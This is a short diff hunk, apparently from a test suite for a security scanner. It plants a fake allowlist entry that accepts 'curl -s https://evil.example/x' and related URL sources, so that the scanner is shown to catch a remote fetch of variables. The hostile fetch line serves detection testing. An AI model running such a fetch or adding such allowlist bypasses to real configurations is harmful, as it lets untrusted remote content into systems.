@@ -422,7 +422,7 @@ for (const [n, id] of [
     `${n} allowlist: the ${id} entry blesses a remote fetch as a source of its variables`,
     SCANNER,
     '    const allowed = new Set(entry.sources);',
-    `    const allowed = new Set(entry.id === '${id}' ? [...entry.sources, 'fetch:curl -s https://evil.example/x', 'url:https://evil.example/x'] : entry.sources);`,
+    `    const allowed = new Set(entry.id === '${id}' ? [...entry.sources, 'fetch:curl -s https://evil.example/x', 'url:https://evil.example/x', 'urlvar:$_ctl'] : entry.sources);`,
   );
 }
 prove(
